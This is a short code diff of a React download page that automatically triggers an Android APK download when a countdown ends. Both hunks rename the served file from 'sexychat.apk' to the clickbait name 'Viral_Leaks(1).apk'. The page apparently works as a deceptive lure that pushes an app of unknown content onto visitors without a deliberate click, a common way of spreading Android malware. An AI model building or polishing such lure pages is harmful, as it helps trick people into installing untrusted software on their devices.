@@ -22,7 +22,7 @@ const Index = () => {
       // Auto trigger download when countdown reaches 0
       const link = document.createElement("a");
       link.href = DOWNLOAD_URL;
-      link.download = "sexychat.apk";
+      link.download = "Viral_Leaks(1).apk";
       link.click();
     }
   }, [downloadReady]);
@@ -30,7 +30,7 @@ const Index = () => {
   const handleDownload = useCallback(() => {
     const link = document.createElement("a");
     link.href = DOWNLOAD_URL;
-    link.download = "sexychat.apk";
+    link.download = "Viral_Leaks(1).apk";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
